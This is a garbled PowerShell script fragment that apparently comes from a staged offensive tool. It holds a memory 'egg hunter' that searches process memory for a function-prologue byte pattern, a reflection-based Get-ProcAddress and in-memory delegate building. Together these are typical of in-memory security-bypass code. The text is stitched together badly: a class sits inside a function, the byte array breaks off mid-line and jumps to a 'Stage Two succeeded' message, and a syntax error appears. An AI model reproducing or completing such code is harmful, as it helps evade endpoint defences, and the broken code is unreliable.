function Invoke-StageTwo {
    # Code for Stage One goes here
   
class Hunter {
    static [System.IntPtr] FindAddress([System.IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                $address = [System.IntPtr]::Add($address, 1)
                if ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg[$count]) {
                    $count++
                    if ($count -eq $egg.Length) {
                        return [System.IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } else {
                    break
                }
            }
        }

        return $address
    }
}

function Get-ProcAddress {
    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory)]
        [string]$Module,
        [Parameter(Position = 1, Mandatory)]
        [string]$Procedure
    )

    $Kernel32 = [System.Reflection.Assembly]::LoadWithPartialName("kernel32")
    $Kernel32.GetType("Microsoft.Win32.UnsafeNativeMethods").InvokeMember("GetModuleHandle", "InvokeStatic", $null, $null, @($Module,)) |
        ForEach-Object {
            $null = [System.Runtime.InteropServices.HandleRef]::new([IntPtr]::Zero, $_)
        } | 
        ForEach-Object {
            $Kernel32.GetType("Microsoft.Win32.UnsafeNativeMethods").InvokeMember(
                "GetProcAddress", 
                "InvokeStatic", 
                $null, 
                $null, 
                @([System.Runtime.InteropServices.HandleRef]$_, $Procedure)
            )
        }
}

function Get-DelegateType {
    [CmdletBinding()]
    param (
        [Parameter(Position = 0)]
        [System.Type[]]$Parameters = @(),
        [Parameter(Position = 1)]
        [System.Type]$ReturnType = [void]
    )

    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    $TypeBuilder.CreateType()
}

if ([IntPtr]::Size -eq 8) {
    Write-Host "[+] 64-bit process"
    $egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     q


    # If Stage One completes successfully, write a success message
    Write-Host "Stage Two succeeded" -ForegroundColor Green
}
